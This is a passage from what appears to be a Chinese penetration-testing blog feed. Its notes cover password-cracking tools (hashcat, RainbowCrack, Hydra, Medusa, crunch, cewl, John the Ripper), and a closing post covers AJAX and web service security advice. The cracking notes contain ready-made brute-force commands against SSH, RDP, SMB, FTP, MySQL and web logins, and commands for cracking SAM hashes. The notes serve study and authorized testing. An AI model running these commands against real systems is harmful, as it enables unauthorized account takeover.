title="Windows系统syskey加密工具"></a><strong>Windows系统syskey加密工具</strong></h4></li><li>cmd:<code>syskey</code></li><li>使用Bootkey利用RC4算法加密SAM数据库</li><li>Bootkey保存于SYSTEM文件中</li></ul><p><strong>Bkhive</strong></p><ul><li><p>从SYSTEM文件中提取bootkey </p></li><li><p>Kali 2.0 抛弃了bkhive </p><p>  apt-get purge samdump2    #卸载samdump2<br>  编译安装:<code>http://http.us.debian.org/debian/pool/main/b/bkhive/</code><br>  make<br>  make install<br>  bkhive SYSTEM key<br>  samdump2 SAM key  (版本已更新，不再支持此功能)<br>  建议使用 Kali 1.x</p></li></ul><blockquote><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><strong>Hashcat</strong></h4></blockquote><p>开源多线程密码破解工具<br>支持80多种加密算法破解<br>基于CPU的计算能力破解<br>六种模式 </p><ol start="0"><li>Straight：字典破解</li><li>Combination：将字典中密码进行组合(1 2 &gt; 11 22 12 21)</li><li>Toggle case：尝试字典中所有密码的大小写字母组合</li><li>Brute force：指定字符集(或全部字符集)所有组合</li><li>Permutation：字典中密码的全部字符置换组合(12 21)</li><li>Table-lookup：程序为字典中所有密码自动生成掩码</li></ol><p><strong>命令</strong></p><pre><code>hashcat -bhashcat -m 100 hash.dump pass.lsthashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d结果：hashcat.pothashcat -m 100 -a 3 hash -i --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l?l = abcdefghijklmnopqrstuvwxyz?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ?d = 0123456789?s =  !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~?a = ?l?u?d?s?b = 0x00 - 0xff</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;离线密码破解&quot;&gt;&lt;a href=&quot;#离线密码破解&quot; class=&quot;headerlink&quot; title=&quot;离线密码破解&quot;&gt;&lt;/a&gt;离线密码破解&lt;/h3&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;身份认证&quot;&gt;&lt;a href=&quot;#身份认证&quot; 
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="kali" scheme="http://c.cat.plus/tags/kali/"/>
    
      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="hashcat" scheme="http://c.cat.plus/tags/hashcat/"/>
    
      <category term="hashid" scheme="http://c.cat.plus/tags/hashid/"/>
    
      <category term="hash‐identifier" scheme="http://c.cat.plus/tags/hash%E2%80%90identifier/"/>
    
      <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
    
  </entry>
  
  <entry>
    <title>oclhashcat基于GPU密码破解及彩虹表破解</title>
    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/oclhashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/23/Password_Attacks/oclhashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-23T09:55:23.000Z</published>
    <updated>2020-05-25T07:48:23.882Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="oclhashcat-离线密码破解"><a href="#oclhashcat-离线密码破解" class="headerlink" title="oclhashcat  离线密码破解"></a><strong>oclhashcat</strong>  离线密码破解</h3><p>号称世界上最快、唯一的基于GPGPU的密码破解软件<br>免费开源、支持多平台、支持分布式、150+hash算法 </p></blockquote><p><strong>硬件支持</strong></p><ul><li>虚拟机中无法使用</li><li>支持 CUDA 技术的Nvidia显卡</li><li>支持 OpenCL 技术的AMD显卡</li><li>安装相应的驱动 </li></ul><p><strong>限制</strong></p><ul><li>最大密码长度 55 字符</li><li>使用Unicode的最大密码长度 27 字符</li></ul><p><strong>关于版本</strong><br>oclHashcat-plus、oclHashcat-lite已经合并为oclhashcat</p><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a><strong>命令</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a</span><br><span class="line"></span><br><span class="line">?l &#x3D; abcdefghijklmnopqrstuvwxyz</span><br><span class="line">?u &#x3D; ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">?d &#x3D; 0123456789</span><br><span class="line">?s &#x3D;  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~</span><br><span class="line">?a &#x3D; ?l?u?d?s</span><br><span class="line">?b &#x3D; 0x00 - 0xff</span><br></pre></td></tr></table></figure><blockquote><h3 id="RainbowCrack-彩虹表离线密码破解"><a href="#RainbowCrack-彩虹表离线密码破解" class="headerlink" title="RainbowCrack 彩虹表离线密码破解"></a><strong>RainbowCrack</strong> 彩虹表离线密码破解</h3></blockquote><p>基于时间记忆权衡技术生成彩虹表<br>提前计算密码的HASH值,通过比对HASH值破解密码<br>计算HASH的速度很慢,修改版支持CUDA GPU<br>    <code>https://www.freerainbowtables.com/en/download/</code></p><h4 id="KALI-中包含的RainbowCrack工具"><a href="#KALI-中包含的RainbowCrack工具" class="headerlink" title="KALI 中包含的RainbowCrack工具"></a><strong>KALI 中包含的RainbowCrack工具</strong></h4><ul><li>rtgen：预计算，生成彩虹表，耗时的阶段</li><li>rtsort：对rtgen生成的彩虹表进行排序</li><li>rcrack：查找彩虹表破解密码 </li><li>以上命令必须顺序使用</li></ul><h4 id="彩虹表"><a href="#彩虹表" class="headerlink" title="彩虹表"></a><strong>彩虹表</strong></h4><ul><li>密码明文、HASH值、HASH算法、字符集、明文长度范围 </li></ul><h5 id="rtgen"><a href="#rtgen" class="headerlink" title="rtgen"></a><code>rtgen</code></h5><p>LanMan、NTLM、MD2、MD4、MD5、SHA1、RIPEMD160<br><code>rtgen md5 loweralpha 1 5 0 10000 10000 0</code><br>计算彩虹表时间可能很长 </p><p><strong>下载彩虹表</strong><br><code>http://www.freerainbowtables.com/en/tables/</code><br><code>http://rainbowtables.shmoo.com/</code></p><h5 id="彩虹表排序"><a href="#彩虹表排序" class="headerlink" title="彩虹表排序"></a><strong>彩虹表排序</strong></h5><pre><code>/usr/share/rainbowcrackrtsort /md5_loweralpha#1-5_0_1000x1000_0.rt</code></pre><h5 id="彩虹表密码破解"><a href="#彩虹表密码破解" class="headerlink" title="彩虹表密码破解"></a><strong>彩虹表密码破解</strong></h5><pre><code>rcrack *.rt-h 5d41402abc4b2a76b9719d911017c592rcrack *.rt-l hash.txt</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;oclhashcat-离线密码破解&quot;&gt;&lt;a href=&quot;#oclhashcat-离线密码破解&quot; class=&quot;headerlink&quot; title=&quot;oclhashcat  离线密码破解&quot;&gt;&lt;/a&gt;&lt;strong&gt;oclhashcat&lt;/s
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="彩虹表" scheme="http://c.cat.plus/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/"/>
    
      <category term="hashcat" scheme="http://c.cat.plus/tags/hashcat/"/>
    
      <category term="GPU" scheme="http://c.cat.plus/tags/GPU/"/>
    
      <category term="RainbowCrack" scheme="http://c.cat.plus/tags/RainbowCrack/"/>
    
  </entry>
  
  <entry>
    <title>Medusa在线密码破解</title>
    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/23/Password_Attacks/medusa%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-22T22:05:13.000Z</published>
    <updated>2020-05-25T07:47:50.498Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Hydra 的缺点</p></blockquote><ul><li>稳定性差，程序时常崩溃</li><li>速度控制不好，容易触发服务屏蔽或锁死机制</li><li>每主机新建进程，每服务新建实例</li><li>大量目标破解时性能差</li></ul><blockquote><p>Medusa 的特点</p></blockquote><ul><li>稳定性好</li><li>速度控制得当</li><li>基于线程</li><li>支持模块少于hydra(不支持RDP)</li><li>WEB-Form支持存在缺陷</li></ul><h4 id="medusa支持破解的模块"><a href="#medusa支持破解的模块" class="headerlink" title="medusa支持破解的模块"></a><strong>medusa支持破解的模块</strong></h4><pre><code>medusa -d </code></pre><h4 id="medusa破解windows密码"><a href="#medusa破解windows密码" class="headerlink" title="medusa破解windows密码"></a><strong>medusa破解windows密码</strong></h4><pre><code>medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</code></pre><h4 id="medusa破解Linux-SSH密码"><a href="#medusa破解Linux-SSH密码" class="headerlink" title="medusa破解Linux SSH密码"></a><strong>medusa破解Linux SSH密码</strong></h4><pre><code>medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns –F</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>medusa -M ftp -h 1.1.1.1 -e ns -F -u ftp -P password.lstmedusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -Fmedusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORMDATA:&quot;post?user=username&amp;pass=password&amp;Login=Login&quot;-n：非默认端口-s：使用SSL连接-T：并发主机数 medusa -M ftp -q</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Hydra 的缺点&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;稳定性差，程序时常崩溃&lt;/li&gt;
&lt;li&gt;速度控制不好，容易触发服务屏蔽或锁死机制&lt;/li&gt;
&lt;li&gt;每主机新建进程，每服务新建实例&lt;/li&gt;
&lt;li&gt;大量目标破解时性能差&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="medusa" scheme="http://c.cat.plus/tags/medusa/"/>
    
      <category term="在线密码破解" scheme="http://c.cat.plus/tags/%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>hydra在线密码破解</title>
    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/23/Password_Attacks/hydra%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-22T19:15:23.000Z</published>
    <updated>2020-05-25T07:44:13.738Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a><strong>Hydra</strong></h3></blockquote><ul><li>九头蛇，砍去一个头即长出新头，后为大力神赫拉克勒斯所杀</li></ul><h4 id="Windows密码破解"><a href="#Windows密码破解" class="headerlink" title="Windows密码破解"></a><strong>Windows密码破解</strong></h4><pre><code>hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vVdhydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV</code></pre><h4 id="Linux密码破解"><a href="#Linux密码破解" class="headerlink" title="Linux密码破解"></a><strong>Linux密码破解</strong></h4><pre><code>hydra -l root -P pass.lst ssh://1.1.1.1 -t 1 -vV</code></pre><h4 id="其他服务密码破解"><a href="#其他服务密码破解" class="headerlink" title="其他服务密码破解"></a><strong>其他服务密码破解</strong></h4><pre><code>hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt -t 64</code></pre><h4 id="hydra图形化界面"><a href="#hydra图形化界面" class="headerlink" title="hydra图形化界面"></a><strong>hydra图形化界面</strong></h4><pre><code>xhydra</code></pre><h4 id="HTTP表单身份认证"><a href="#HTTP表单身份认证" class="headerlink" title="HTTP表单身份认证"></a><strong>HTTP表单身份认证</strong></h4><pre><code>hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vhydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:Login Failed&quot; -V    #失败/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:FooC:先访问指定页面取得cookieH:指定http头https-post-form、http-get-form、https-get-form-S：使用SSL连接</code></pre><h4 id="pw-inspector-hydra软件包附带工具"><a href="#pw-inspector-hydra软件包附带工具" class="headerlink" title="pw-inspector hydra软件包附带工具"></a><strong>pw-inspector</strong> hydra软件包附带工具</h4><p>按长度和字符集筛选字典</p><pre><code>pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></pre><h4 id="密码破解效率"><a href="#密码破解效率" class="headerlink" title="密码破解效率"></a><strong>密码破解效率</strong></h4><ul><li>密码复杂度(字典命中率)</li><li>带宽、协议、服务器性能、客户端性能</li><li>锁定阈值</li><li>单位时间最大登陆请求次数</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Hydra&quot;&gt;&lt;a href=&quot;#Hydra&quot; class=&quot;headerlink&quot; title=&quot;Hydra&quot;&gt;&lt;/a&gt;&lt;strong&gt;Hydra&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;九头蛇，砍去一个
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="Linux密码破解" scheme="http://c.cat.plus/tags/Linux%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="在线密码破解" scheme="http://c.cat.plus/tags/%E5%9C%A8%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="hydra" scheme="http://c.cat.plus/tags/hydra/"/>
    
  </entry>
  
  <entry>
    <title>密码破解方法及Crunch字典生成工具</title>
    <link href="http://c.cat.plus/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</id>
    <published>2015-05-21T09:05:17.000Z</published>
    <updated>2020-05-25T07:41:37.778Z</updated>
    
    <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h3><p>目标系统实施了强安全措施</p><ul><li>安装了所有补丁 </li><li>无任何已知漏洞 </li><li>无应用层漏洞 </li><li>攻击面最小化<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><strong>社会工程学</strong></h4>获取目标系统用户身份 </li><li>非授权用户不受信，认证用户可以访问守信资源 </li><li>已有用户账号权限受限，需要提权 </li><li>不会触发系统报警</li></ul><h4 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a><strong>身份认证方法</strong></h4><ul><li>证明你是你声称你是的那个人</li><li>你知道什么（账号密码、pin、passphrase） </li><li>你有什么（令牌、token、key、证书、密宝、手机）</li><li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别） </li><li>以上方法结合使用（多因素身份认证）<br>基于互联网的身份验证仍以账号密码为主要形式</li></ul><blockquote><h3 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a><strong>密码破解方法</strong></h3></blockquote><h4 id="人工猜解"><a href="#人工猜解" class="headerlink" title="人工猜解"></a><strong>人工猜解</strong></h4><ul><li>垃圾桶工程</li><li>被动信息收集 <h4 id="基于字典暴力破解（主流）"><a href="#基于字典暴力破解（主流）" class="headerlink" title="基于字典暴力破解（主流）"></a>基于字典暴力破解（主流）</h4><h4 id="键盘空间字符暴破"><a href="#键盘空间字符暴破" class="headerlink" title="键盘空间字符暴破"></a>键盘空间字符暴破</h4></li></ul><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul><li>保存有用户名和密码的文本文件 </li><li>/usr/share/wordlist </li><li>/usr/share/wfuzz/wordlist </li><li>/usr/share/seclists</li></ul><blockquote><h3 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a><strong>字典</strong></h3></blockquote><h4 id="键盘空间字符爆破"><a href="#键盘空间字符爆破" class="headerlink" title="键盘空间字符爆破"></a>键盘空间字符爆破</h4><ul><li>全键盘空间字符</li><li>部分键盘空间字符 (基于规则)</li><li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li></ul><h4 id="crunch-创建字典"><a href="#crunch-创建字典" class="headerlink" title="crunch 创建字典"></a><strong>crunch 创建字典</strong></h4><pre><code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]&lt;charset string&gt; 默认是小写字符crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100-b 按大小分割字典文件(kb/kib、mb/mib、gb/gib)-c 每个字典的行数以上两个参数必须与-o START 结合使用-d 同一字符连贯出现数量(11 / aaa)</code></pre><h4 id="使用字符集"><a href="#使用字符集" class="headerlink" title="使用字符集"></a><strong>使用字符集</strong></h4><p><code>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></p><h4 id="无重复字符"><a href="#无重复字符" class="headerlink" title="无重复字符"></a><strong>无重复字符</strong></h4><p><code>crunch 1 1 -p 1234567890 | more</code><br>    必须是最后一个参数<br>    最大、最小字符长度失效，但必须存在<br>    与-s 参数不兼容（-s 指定起始字符串）<br><code>crunch 4 4 0123456789 -s 9990</code></p><ul><li>读取文件中每行内容作为基本字符生成字典<br><code>crunch 1 1 -q read</code></li></ul><h4 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a><strong>字典组成规则</strong></h4><pre><code>crunch 6 6 -t @,%%^^ | more</code></pre><ul><li>@：小写字母 lalpha</li><li>,：大写字母 ualpha</li><li>%：数字 numeric</li><li>^：符号 symbols<h4 id="输出文件压缩"><a href="#输出文件压缩" class="headerlink" title="输出文件压缩"></a><strong>输出文件压缩</strong></h4>  <code>crunch 4 4 -t @,%^ -o 1.txt -z 7z</code><br>   其他压缩格式：gzip、bzip2、lzma<br>   7z压缩比率最大</li></ul><p><strong>Use example:</strong></p><pre><code>crunch 4 4 -f /usr/share/crunch/charset.lst mixalphanumeric-all-space -o w.txt -t @d@@ -s cdabcrunch 4 5 -p dog cat birdcrunch 5 5 abc DEF + \!@# -t ,@^%,    + 占位符    \ 转义符(空格、符号)crunch 5 5 -t ddd%% -p dog cat bird    任何不同于-p 参数指定的值都是占位符crunch 5 5 -d 2@ -t @@@%%组合破解工具应用 crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd</code></pre><h4 id="按个人信息生成其专属的密码字典"><a href="#按个人信息生成其专属的密码字典" class="headerlink" title="按个人信息生成其专属的密码字典"></a><strong>按个人信息生成其专属的密码字典</strong></h4><p><strong>CUPP：Common User Password Profiler</strong><br>    git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a><br>    python cup.py -i</p><p>通过收集网站信息生成字典<br>    cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt<br>    -m：最小单词长度<br>    -e：收集包含email地址信息<br>    -c：每个单词出现次数<br>    支持基本、摘要 身份认证<br>    支持代理<br><strong>用户密码变型</strong></p><ul><li>基于 cewl 的结果进行密码变型 </li><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号互相转换 </li><li>字母与数字互相转换 </li><li>P@$$w0rd</li></ul><p><strong>使用 John the Ripper 配置文件实现密码动态变型</strong><br>    /etc/john/john.conf<br>    [List.Rules:Wordlist]<br>    $[0-9]$[0-9]$[0-9]<br>    john –wordlist=cewl.txt –rules –stdout &gt; m.txt</p><pre><code>[List.Rules:test]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`~!@#$%^&amp;*()\-_=+]john --wordlist=cewl.txt --rules=test --stdout &gt; m.txtjohn --wordlist=ahm.lst --rules=test HASHFILE</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;&lt;strong&gt;思路&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;目标系统实施了强安全措施&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装了所有补丁 &lt;/li&gt;
&lt;li&gt;无任何已知漏洞 &lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="Wordlist" scheme="http://c.cat.plus/tags/Wordlist/"/>
    
      <category term="crunch" scheme="http://c.cat.plus/tags/crunch/"/>
    
  </entry>
  
  <entry>
    <title>AJAX技术组合及WebService安全考虑</title>
    <link href="http://c.cat.plus/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/"/>
    <id>http://c.cat.plus/2014/05/21/Web_Attacks/AJAX%E6%8A%80%E6%9C%AF%E7%BB%84%E5%90%88%E5%8F%8AWebService%E5%AE%89%E5%85%A8%E8%80%83%E8%99%91/</id>
    <published>2014-05-20T20:02:37.000Z</published>
    <updated>2020-05-21T08:00:21.818Z</updated>
    
    <content type="html"><![CDATA[<h4 id="AJAX-Asynchronous-Javascript-and-XML-异步JS和XML"><a href="#AJAX-Asynchronous-Javascript-and-XML-异步JS和XML" class="headerlink" title="AJAX (Asynchronous Javascript and XML)        //异步JS和XML"></a><strong>AJAX</strong> (Asynchronous Javascript and XML)        //异步JS和XML</h4><p>是一个概念,而非一种新的编程语言,是一组现有技术的组合<br>通过客户端脚本动态更新页面部分内容,而非整个页面<br>降低带宽使用,提高速度<br>提升用户体验<br>后台异步访问</p><p><strong>AJAX组件</strong><br>JavaScript: ajax的核心组件,使用XMLHTTPRequest 对象接口向服务器发起请求,接收并处理服务器响应数据<br><strong>Dynamic HTML</strong>(DHTML)<br>早于AJAX出现,通过Javascript,CSS等在客户端修改HTML页面element,缺点是完全依赖客户端代码修改页面,与服务器<br>的交互由JavaScript applets完成,AJAX的XHR弥补了他的缺点(注册用户)<br><strong>Document Object Model(DOM)</strong><br>处理html,xml文档对象的框架,DHTML是一个浏览器,DOM作为其一个实现的接口,定义和管理每个页面元素obj的Properties,method,event.</p><p><strong>基于AJAX的WEB应用工作流程</strong><br>XMLHTTPRequest API创建对象xmlhttp进行访问<br>XML,json,html,文本,图片<br>多个异步请求独立通信,互不依赖<br>AJAX框架<br>    JQuery<br>    Dojo Toolkit<br>    Google web toolkit(GWT)<br>    Microsoft AJAX library</p><p>目前没有通用的AJAX安全最佳实践,其攻击面不为大多数人所知<br>AJAX的安全问题<br>多种技术混合,增加了攻击面,每个参数都可能形成独立的攻击过程<br>AJAX引擎是个全功能的脚本解释器,访问恶意站点可能后果严重,虽然浏览器有砂箱和SOP,但可被绕过<br>服务器,客户端代码结合使用产生混乱,服务器访问控制不当,将信息泄露<br>暴露应用程序逻辑</p><h4 id="AJAX对渗透测试的挑战"><a href="#AJAX对渗透测试的挑战" class="headerlink" title="AJAX对渗透测试的挑战"></a><strong>AJAX对渗透测试的挑战</strong></h4><ul><li>异步请求数量多且隐蔽</li><li>触发AJAX请求的条件无规律</li><li>手动和截断代理爬网可能产生大量遗漏<br>AJAX爬网工具<br>  ZAP<br>客户端代码审计<br>  源码<br>  firebug</li></ul><h4 id="WEB-Service"><a href="#WEB-Service" class="headerlink" title="WEB Service"></a><strong>WEB Service</strong></h4><p>面向服务的架构(Service Oriented Architecture)便于不同系统集成共享数据和功能<br>尤其适合不想暴漏数据模型和程序逻辑而访问数据的场景<br>无页面</p><p><strong>两种类型WEB Service</strong><br>Simple Object Access Protosol(SOAP)        //简单对象访问协议<br>    传统的Web service开发方法,xml是唯一的数据交换格式<br>    要求安全性的应用更多采用<br>RESTful(Representational State Transfer architecture) REST        //代表性状态传输架构<br>    目前更多被采用的轻量web service,JSON是首选数据交换格式</p><h4 id="WEB-Service安全考虑"><a href="#WEB-Service安全考虑" class="headerlink" title="WEB Service安全考虑"></a><strong>WEB Service安全考虑</strong></h4><p>使用API key或session token实现和跟踪身份认证<br>身份认证由服务器完成,而非客户端<br>API key,用户名,Session token永远不要通过URL发送<br>RESTful默认不提供任何安全机制,需要使用SSL/TLS保护传输数据安全<br>SOAP提供强于HTTPS的WS-security机制<br>使用OAuth或HMAC进行身份验证,HMAC身份认证使用C/S共享的密钥加密API key<br>RESTful应只允许身份认证用户使用PUT,DELETE方法<br>使用随机token防止CSRF攻击</p><p>对用户提交参数过滤,建议部署基于严格白名单的方法<br>报错信息消毒<br>直接对象引用应严格身份验证</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;AJAX-Asynchronous-Javascript-and-XML-异步JS和XML&quot;&gt;&lt;a href=&quot;#AJAX-Asynchronous-Javascript-and-XML-异步JS和XML&quot; class=&quot;headerlink&quot; title=&quot;AJ
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Web渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Web%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="AJAX" scheme="http://c.cat.plus/tags/AJAX/"/>
    
